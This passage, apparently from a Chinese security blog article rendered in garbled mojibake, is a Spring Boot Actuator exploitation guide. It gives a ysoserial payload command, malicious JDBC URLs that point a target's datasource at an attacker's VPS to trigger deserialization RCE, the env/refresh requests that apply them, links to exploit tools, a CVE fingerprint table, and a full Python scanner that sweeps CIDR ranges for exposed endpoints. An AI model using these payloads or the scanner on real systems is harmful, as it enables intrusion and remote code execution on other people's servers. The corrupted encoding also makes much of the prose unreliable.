è¯´æ˜ï¼šåœ¨è‡ªå·±æœåŠ¡å™¨ä¸Šè¿è¡Œ springboot-jdbc-deserialization-rce.py è„šæœ¬ï¼Œå¹¶ä½¿ç”¨ ysoserial è‡ªå®šä¹‰è¦æ‰§è¡Œçš„å‘½ä»¤

    
    
    wget https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-jdbc-deserialization-rce.py  
    
    
    
    java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections3 "curl xxx" > payload.ser  
    

åœ¨è„šæœ¬åŒç›®å½•ä¸‹ç”Ÿæˆ payload.ser ååºåˆ—åŒ–payloadæ–‡ä»¶ä¾›EXPè„šæœ¬ä½¿ç”¨

#### 3ï¼šè®¾ç½® spring.datasource.url å±æ€§

è¯´æ˜ï¼šä¿®æ”¹è¿™ä¸ªå±æ€§ä¼šå¯¼è‡´Mysqlç˜«ç—ªï¼Œéœ€è¦è°¨æ…æ“ä½œ

Mysql-connector-java 5.x ç‰ˆæœ¬è®¾ç½®å±æ€§å€¼ä¸ºï¼š

    
    
    jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&useSSL=false&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true  
    

Mysql-connector-java 8.x ç‰ˆæœ¬è®¾ç½®å±æ€§å€¼ä¸ºï¼š

    
    
    jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&useSSL=false&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true  
    

spring 1.x

    
    
    POST /env  
    Content-Type: application/x-www-form-urlencoded   
      
    spring.datasource.url=å¯¹åº”å±æ€§å€¼  
    

spring 2.x

    
    
    POST /actuator/env   
    Content-Type: application/json   
      
    {"name":"spring.datasource.url","value":"å¯¹åº”å±æ€§å€¼"}  
    

#### 4ï¼šåˆ·æ–°é…ç½®

pring 1.x

    
    
    POST /refresh  
    Content-Type: application/x-www-form-urlencoded  
    

spring 2.x

    
    
    POST /actuator/refresh  
    Content-Type: application/json  
    

#### 5ï¼šå‡ºå‘æ•°æ®åº“æŸ¥è¯¢

è¯´æ˜ï¼šå°è¯•è®¿é—®ç½‘ç«™å·²çŸ¥çš„æ•°æ®åº“æŸ¥è¯¢çš„æ¥å£ï¼Œä¾‹å¦‚ï¼š /product/listï¼Œæˆ–è€…å¯»æ‰¾å…¶ä»–æ–¹å¼ï¼Œä¸»åŠ¨è§¦å‘æºç½‘ç«™è¿›è¡Œæ•°æ®åº“æŸ¥è¯¢ï¼Œç„¶åæ¼æ´ä¼šè¢«è§¦å‘

#### 6ï¼šæ¢å¤æ­£å¸¸ jdbc url

ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨å®Œæˆåï¼Œä½¿ç”¨ æ­¥éª¤ä¸‰çš„æ–¹æ³•æ¢å¤ æ­¥éª¤ä¸€ä¸­è®°å½•çš„ spring.datasource.url çš„åŸå§‹  value å€¼

  

 **OVER OVER**  

 **é™„å¸¦å‡ ä¸ªå·¥å…·**

##  1.SB-Actuator

 **https://github.com/rabbitmask/SB-Actuator**

    
    
     git clone https://github.com/rabbitmask/SB-Actuator.git

2.Spring Boot Exploit

https://github.com/0x727/SpringBootExploit

    
    
    git clone https://github.com/0x727/SpringBootExploit.git

## 3.Spring4shell

é¡¹ç›®åœ°å€ï¼šhttps://github.com/reznok/Spring4Shell-POC

    
    
    git clone https://github.com/reznok/Spring4Shell-POC.git  
    

## 4.Spring Core RCE

é¡¹ç›®åœ°å€ï¼šhttps://github.com/TheGejr/SpringShell

    
    
    git clone https://github.com/TheGejr/SpringShell.git

  

 **é™„å¸¦ä¸€ä¸ªæŒ‡çº¹è¡¨**

    
    
      
    
    
     1 /gs-guide-websocket  CVE-2018-1270
    
      
    
    
    2 å­˜åœ¨è¡¨å•äº¤äº’  CVE-2018-1273
    
        or
    
        CVE-2017-4971
    
      
    
    
    3 å…¨æ˜¯jsonæ ¼å¼ä¸”æ˜¯Restfulé£æ ¼çš„api
    
      
    
    
    4- /oauth/authorize ä¸”å­˜åœ¨ç™»å½•ç•Œé¢  CVE-2016-4977
    
      
    
    
    5 /functionRouter   CVE-2022-22963
    
      
    
    
    6 Actuator envæ³„éœ²
    
        6.1 eureka --> eureka RCE    6.2  springt-boot-strater-actuator and spring-cloud-straterSnakeyaml RCE    6.4  race æœ€è¿‘è¯·æ±‚ä¿¡æ¯,ä¾‹å¦‚ç™»å½•æƒ…å†µ  
        6.4  h2database  h2database query RCE    6.5  mappings  æœªæˆæƒæ¥å£    6.6  trace  è®¤è¯ä¿¡æ¯ ä¾‹cookie    6.7  refresh  getshell    6.8  mangodb  æ•°æ®åº“è´¦å·å¯†ç 
    
      
    
    
    7  Spring Boot ä¼ å‚è§¦å‘é»˜è®¤é”™è¯¯é¡µé¢  whitelabel error page SpEL RCE
    
      
    
    
    8 /actutor/gateway CVE-2022-22947
    
      
    
    
    9 Spring + mongodb  CVE-2022-22980
    
      
    

 **ä¸€ä¸ªè¯†åˆ« **Spring Boot Actuator** æœªæˆæƒè®¿é—®çš„è„šæœ¬**

    
          *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 
    
    
    
    import argparseimport reimport requestsfrom multiprocessing import Pool, Managerfrom concurrent.futures import ThreadPoolExecutorimport ipaddress  
      
    requests.packages.urllib3.disable_warnings()headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0",           "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",}  
    executor = ThreadPoolExecutor()  
    # Spring Boot < 1.5 é»˜è®¤æœªæˆæƒè®¿é—®æ‰€æœ‰ç«¯ç‚¹# Spring Boot >= 1.5 é»˜è®¤åªå…è®¸è®¿é—®/healthå’Œ/infoç«¯ç‚¹ï¼Œä½†æ˜¯æ­¤å®‰å…¨æ€§é€šå¸¸è¢«åº”ç”¨ç¨‹åºå¼€å‘äººå‘˜ç¦ç”¨# å¦å¤–è€ƒè™‘åˆ°äººä¸ºå…³é—­é»˜è®¤ç«¯ç‚¹å¼€å¯éé»˜è®¤ç«¯ç‚¹çš„æƒ…å†µï¼Œç»¼ä¸Šæ‰€è¿°ï¼Œæ­¤å¤„é‡‡ç”¨æš´åŠ›æ¨¡å¼é…åˆå¼‚æ­¥å¹¶å‘ï¼ˆå­è¿›ç¨‹ä¸­åµŒå¥—å¼‚æ­¥å­çº¿ç¨‹ï¼‰è§£å†³ã€‚pathlist=['/autoconfig','/beans','/configprops','/dump','/health','/info','/mappings','/metrics','/trace',]  
    def getinfo(filepath):    fr = open(filepath, 'r')    ips=fr.readlines()    fr.close()    return ips  
    def saveinfo(result):    if result:        fw=open('result.txt','a')        fw.write(result+'\n')        fw.close()  
    def sbcheck(ip):    url= str(ip)    try:        r = requests.get(url+ '/404', headers=headers,timeout=10,verify=False)        if r.status_code==404 or r.status_code==403:            if 'Whitelabel Error Page' in r.text  or 'There was an unexpected error'in r.text:                print("It's A Spring Boot Web APP: {}".format(url))                saveinfo( "It's A Spring Boot Web APP: {}".format(url))                executor.submit(sb_Actuator,url)                return 1    except requests.exceptions.ConnectTimeout:        return 0.0    except requests.exceptions.ConnectionError:        return 0.1  
      
    def isSB(ip,q):    print('>>>>> {}'.format(ip))    sbcheck(ip)    q.put(ip)  
      
    #å¤§å¤šæ•°Actuatorä»…æ”¯æŒGETè¯·æ±‚å¹¶ä»…æ˜¾ç¤ºæ•æ„Ÿçš„é…ç½®æ•°æ®,å¦‚æœä½¿ç”¨äº†Jolokiaç«¯ç‚¹ï¼Œå¯èƒ½ä¼šäº§ç”ŸXXEã€ç”šè‡³æ˜¯RCEå®‰å…¨é—®é¢˜ã€‚#é€šè¿‡æŸ¥çœ‹/jolokia/list ä¸­å­˜åœ¨çš„ Mbeansï¼Œæ˜¯å¦å­˜åœ¨logback åº“æä¾›çš„reloadByURLæ–¹æ³•æ¥è¿›è¡Œåˆ¤æ–­ã€‚def Jolokiacheck(url):    url_tar = url + '/jolokia/list'    r = requests.get(url_tar, headers=headers, verify=False)    if r.status_code == 200:        print("ç›®æ ‡ç«™ç‚¹å¼€å¯äº† jolokia ç«¯ç‚¹çš„æœªæˆæƒè®¿é—®,è·¯å¾„ä¸ºï¼š{}".format(url_tar))        saveinfo("ç›®æ ‡ç«™ç‚¹å¼€å¯äº† jolokia ç«¯ç‚¹çš„æœªæˆæƒè®¿é—®,è·¯å¾„ä¸ºï¼š{}".format(url_tar))        if 'reloadByURL' in r.text:            print("ç›®æ ‡ç«™ç‚¹å¼€å¯äº† jolokia ç«¯ç‚¹ä¸”å­˜åœ¨reloadByURLæ–¹æ³•,å¯è¿›è¡ŒXXE/RCEæµ‹è¯•,è·¯å¾„ä¸ºï¼š{}".format(url_tar))            saveinfo("ç›®æ ‡ç«™ç‚¹å¼€å¯äº† jolokia ç«¯ç‚¹ä¸”å­˜åœ¨reloadByURLæ–¹æ³•,å¯è¿›è¡ŒXXE/RCEæµ‹è¯•,è·¯å¾„ä¸ºï¼š{}".format(url_tar))        if 'createJNDIRealm' in r.text:            print("ç›®æ ‡ç«™ç‚¹å¼€å¯äº† jolokia ç«¯ç‚¹ä¸”å­˜åœ¨createJNDIRealmæ–¹æ³•,å¯è¿›è¡ŒJNDIæ³¨å…¥RCEæµ‹è¯•,è·¯å¾„ä¸ºï¼š{}".format(url_tar))            saveinfo("ç›®æ ‡ç«™ç‚¹å¼€å¯äº† jolokia ç«¯ç‚¹ä¸”å­˜åœ¨createJNDIRealmæ–¹æ³•,å¯è¿›è¡ŒJNDIæ³¨å…¥RCEæµ‹è¯•,è·¯å¾„ä¸ºï¼š{}".format(url_tar))  
      
    #Spring Boot envç«¯ç‚¹å­˜åœ¨ç¯å¢ƒå±æ€§è¦†ç›–å’ŒXStreamååºåˆ—åŒ–æ¼æ´def Envcheck_1(url):    url_tar = url + '/env'    r = requests.get(url_tar, headers=headers, verify=False)    if r.status_code == 200:        print("ç›®æ ‡ç«™ç‚¹å¼€å¯äº† env ç«¯ç‚¹çš„æœªæˆæƒè®¿é—®,è·¯å¾„ä¸ºï¼š{}".format(url_tar))        saveinfo("ç›®æ ‡ç«™ç‚¹å¼€å¯äº† env ç«¯ç‚¹çš„æœªæˆæƒè®¿é—®,è·¯å¾„ä¸ºï¼š{}".format(url_tar))        if 'spring.cloud.bootstrap.location' in r.text:            print("ç›®æ ‡ç«™ç‚¹å¼€å¯äº† env ç«¯ç‚¹ä¸”spring.cloud.bootstrap.locationå±æ€§å¼€å¯,å¯è¿›è¡Œç¯å¢ƒå±æ€§è¦†ç›–RCEæµ‹è¯•,è·¯å¾„ä¸ºï¼š{}".format(url_tar))            saveinfo("ç›®æ ‡ç«™ç‚¹å¼€å¯äº† env ç«¯ç‚¹ä¸”spring.cloud.bootstrap.locationå±æ€§å¼€å¯,å¯è¿›è¡Œç¯å¢ƒå±æ€§è¦†ç›–RCEæµ‹è¯•,è·¯å¾„ä¸ºï¼š{}".format(url_tar))        if 'eureka.client.serviceUrl.defaultZone' in r.text:            print("ç›®æ ‡ç«™ç‚¹å¼€å¯äº† env ç«¯ç‚¹ä¸”eureka.client.serviceUrl.defaultZoneå±æ€§å¼€å¯,å¯è¿›è¡ŒXStreamååºåˆ—åŒ–RCEæµ‹è¯•,è·¯å¾„ä¸ºï¼š{}".format(url_tar))            saveinfo("ç›®æ ‡ç«™ç‚¹å¼€å¯äº† env ç«¯ç‚¹ä¸”eureka.client.serviceUrl.defaultZoneå±æ€§å¼€å¯,å¯è¿›è¡ŒXStreamååºåˆ—åŒ–RCEæµ‹è¯•,è·¯å¾„ä¸ºï¼š{}".format(url_tar))  
    #Spring Boot 1.xç‰ˆæœ¬ç«¯ç‚¹åœ¨æ ¹URLä¸‹æ³¨å†Œã€‚def sb1_Actuator(url):    key=0    Envcheck_1(url)    Jolokiacheck(url)    for i in pathlist:        url_tar = url+i        r = requests.get(url_tar, headers=headers, verify=False)        if r.status_code==200:            print("ç›®æ ‡ç«™ç‚¹å¼€å¯äº† {} ç«¯ç‚¹çš„æœªæˆæƒè®¿é—®,è·¯å¾„ä¸ºï¼š{}".format(i.replace('/',''),url_tar))            saveinfo("ç›®æ ‡ç«™ç‚¹å¼€å¯äº† {} ç«¯ç‚¹çš„æœªæˆæƒè®¿é—®,è·¯å¾„ä¸ºï¼š{}".format(i.replace('/',''),url_tar))            key=1    return key  
    #Spring Boot 2.xç‰ˆæœ¬å­˜åœ¨H2é…ç½®ä¸å½“å¯¼è‡´çš„RCE  
    def Envcheck_2(url):    url_tar = url + '/actuator/env'    r = requests.get(url_tar, headers=headers, verify=False)    if r.status_code == 200:        print("ç›®æ ‡ç«™ç‚¹å¼€å¯äº† env ç«¯ç‚¹çš„æœªæˆæƒè®¿é—®,è·¯å¾„ä¸ºï¼š{}".format(url_tar))        saveinfo("ç›®æ ‡ç«™ç‚¹å¼€å¯äº† env ç«¯ç‚¹çš„æœªæˆæƒè®¿é—®,è·¯å¾„ä¸ºï¼š{}".format(url_tar))        if 'spring.cloud.bootstrap.location' in r.text:            print("ç›®æ ‡ç«™ç‚¹å¼€å¯äº† env ç«¯ç‚¹ä¸”spring.cloud.bootstrap.locationå±æ€§å¼€å¯,å¯è¿›è¡Œç¯å¢ƒå±æ€§è¦†ç›–RCEæµ‹è¯•,è·¯å¾„ä¸ºï¼š{}".format(url_tar))            saveinfo("ç›®æ ‡ç«™ç‚¹å¼€å¯äº† env ç«¯ç‚¹ä¸”spring.cloud.bootstrap.locationå±æ€§å¼€å¯,å¯è¿›è¡Œç¯å¢ƒå±æ€§è¦†ç›–RCEæµ‹è¯•,è·¯å¾„ä¸ºï¼š{}".format(url_tar))        if 'eureka.client.serviceUrl.defaultZone' in r.text:            print("ç›®æ ‡ç«™ç‚¹å¼€å¯äº† env ç«¯ç‚¹ä¸”eureka.client.serviceUrl.defaultZoneå±æ€§å¼€å¯,å¯è¿›è¡ŒXStreamååºåˆ—åŒ–RCEæµ‹è¯•,è·¯å¾„ä¸ºï¼š{}".format(url_tar))            saveinfo("ç›®æ ‡ç«™ç‚¹å¼€å¯äº† env ç«¯ç‚¹ä¸”eureka.client.serviceUrl.defaultZoneå±æ€§å¼€å¯,å¯è¿›è¡ŒXStreamååºåˆ—åŒ–RCEæµ‹è¯•,è·¯å¾„ä¸ºï¼š{}".format(url_tar))        headers["Cache-Control"]="max-age=0"        rr = requests.post(url+'/actuator/restart', headers=headers, verify=False)        if rr.status_code == 200:            print("ç›®æ ‡ç«™ç‚¹å¼€å¯äº† env ç«¯ç‚¹ä¸”æ”¯æŒrestartç«¯ç‚¹è®¿é—®,å¯è¿›è¡ŒH2 RCEæµ‹è¯•,è·¯å¾„ä¸ºï¼š{}".format(url+'/actuator/restart'))            saveinfo("ç›®æ ‡ç«™ç‚¹å¼€å¯äº† env ç«¯ç‚¹ä¸”æ”¯æŒrestartç«¯ç‚¹è®¿é—®,å¯è¿›è¡ŒH2 RCEæµ‹è¯•,è·¯å¾„ä¸ºï¼š{}".format(url+'/actuator/restart'))  
      
      
    #Spring Boot 2.xç‰ˆæœ¬ç«¯ç‚¹ç§»åŠ¨åˆ°/actuator/è·¯å¾„ã€‚def sb2_Actuator(url):    Envcheck_2(url)    Jolokiacheck(url+'/actuator')    for i in pathlist:        url_tar = url+'/actuator'+i        r = requests.get(url_tar, headers=headers, verify=False)        if r.status_code==200:            print("ç›®æ ‡ç«™ç‚¹å¼€å¯äº† {} ç«¯ç‚¹çš„æœªæˆæƒè®¿é—®,è·¯å¾„ä¸ºï¼š{}".format(i.replace('/',''),url_tar))            saveinfo("ç›®æ ‡ç«™ç‚¹å¼€å¯äº† {} ç«¯ç‚¹çš„æœªæˆæƒè®¿é—®,è·¯å¾„ä¸ºï¼š{}".format(i.replace('/', ''), url_tar))  
      
      
      
    def sb_Actuator(url):    try:        if sb1_Actuator(url)==0:            sb2_Actuator(url)    except:        pass  
    def Cidr_ips(cidr):    ips=[]    for ip in ipaddress.IPv4Network(cidr):        ips.append('%s'%ip)    return ips  
      
    def cidrscan(cidr):    if re.match(r"^(?:(?:[0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}(?:[0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\/([1-9]|[1-2]\d|3[0-2])$",cidr):        curls = []        ips=Cidr_ips(cidr)        for i in ips:            curls.append('http://'+i)            curls.append('https://'+i)        poolmana(curls)    else:        print("CIDRæ ¼å¼è¾“å…¥æœ‰è¯¯ï¼Œé”¤ä½ æ˜‚w(ï¾ŸĞ”ï¾Ÿ)w")  
      
    def poolmana(ips):    p = Pool(10)    q = Manager().Queue()    for i in ips:        i=i.replace('\n','')        p.apply_async(isSB, args=(i,q,))    p.close()    p.join()    print('æ£€ç´¢å®Œæˆ>>>>>\nè¯·æŸ¥çœ‹å½“å‰è·¯å¾„ä¸‹æ–‡ä»¶ï¼šresult.txt')  
      
    def run(filepath):    ips=getinfo(filepath)    poolmana(ips)  
      
    if __name__ == '__main__':    parser = argparse.ArgumentParser()    parser.add_argument("-u", "--url", dest='url',help="å•ç›®æ ‡æ‰«æ")    parser.add_argument("-s", "--surl", dest='surl', help="å•ç›®æ ‡æ‰«æ(è·³è¿‡æŒ‡çº¹)")    parser.add_argument("-c", "--cidr", dest='cidr', help="CIDRæ‰«æ(80/443)")    parser.add_argument("-f", "--file", dest='file', help="ä»æ–‡ä»¶åŠ è½½ç›®æ ‡")  
        args = parser.parse_args()    if args.url:        res=sbcheck(args.url)        if res==1:            pass        elif res==0.0:            print("ä¸ç›®æ ‡ç½‘ç»œè¿æ¥å¼‚å¸¸ï¼Œtimeouté»˜è®¤ä¸º10sï¼Œè¯·æ ¹æ®ç½‘ç»œç¯å¢ƒè‡ªè¡Œæ›´æ”¹")        elif res==0.1:            print("ä¸ç›®æ ‡ç½‘ç»œè¿æ¥å¼‚å¸¸ï¼Œç›®æ ‡è®¡ç®—æœºç§¯ææ‹’ç»ï¼Œæ— æ³•è¿æ¥")        else:            print("ç›®æ ‡æœªä½¿ç”¨spring bootæˆ–æœ¬è„šæœ¬è¯†åˆ«æ¨¡å—ä¸å¤Ÿå®Œå–„ï¼Œå¦‚ä¸ºåè€…æ¬¢è¿åé¦ˆIssue")    elif args.surl:        sb_Actuator(args.surl)    elif args.cidr:        cidrscan(args.cidr)    elif args.file:        run(args.file)

  * 

    
    
      
    

è¾“å…¥æ ¼å¼ä¾‹å¦‚ï¼šhttp:127.0.0.1   or https://xxx.com  
  

    
    
     **å‡ ä¸ªspringæ¼æ´æ£€æµ‹åˆ©ç”¨å·¥å…·**  
    
    
      * 
    
    
    
     https://github.com/13exp/SpringBoot-Scan-GUI

  * 

    
    
    https://github.com/AabyssZG/SpringBoot-Scan

ä¸€ä¸ªbpçš„æ’ä»¶

  * 

    
    
    https://github.com/whwlsfb/SpringSpider

 **å‡ ä¸ªæŒ‡çº¹è¯†åˆ«å·¥å…·**  

  * 

    
    
     https://github.com/urbanadventurer/WhatWeb

  * 

    
    
    https://github.com/TideSec/TideFinger

  * 

    
    
    https://github.com/EdgeSecurityTeam/EHole

é¢„è§ˆæ—¶æ ‡ç­¾ä¸å¯ç‚¹

å¾®ä¿¡æ‰«ä¸€æ‰«  
å…³æ³¨è¯¥å…¬ä¼—å·

[çŸ¥é“äº†](javascript:;)

å¾®ä¿¡æ‰«ä¸€æ‰«  
ä½¿ç”¨å°ç¨‹åº

****

[å–æ¶ˆ](javascript:void\(0\);) [å…è®¸](javascript:void\(0\);)

****

[å–æ¶ˆ](javascript:void\(0\);) [å…è®¸](javascript:void\(0\);)

ï¼š ï¼Œ ã€‚   è§†é¢‘ å°ç¨‹åº èµ ï¼Œè½»ç‚¹ä¸¤ä¸‹å–æ¶ˆèµ åœ¨çœ‹ ï¼Œè½»ç‚¹ä¸¤ä¸‹å–æ¶ˆåœ¨çœ‹

